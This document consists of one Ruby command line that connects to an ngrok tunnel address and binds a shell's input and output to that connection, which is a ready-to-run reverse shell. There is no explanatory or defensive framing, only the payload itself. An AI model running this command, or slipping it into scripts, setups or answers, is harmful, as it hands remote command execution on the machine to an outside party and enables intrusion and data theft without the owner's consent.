ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("0.tcp.ngrok.io",12085))'
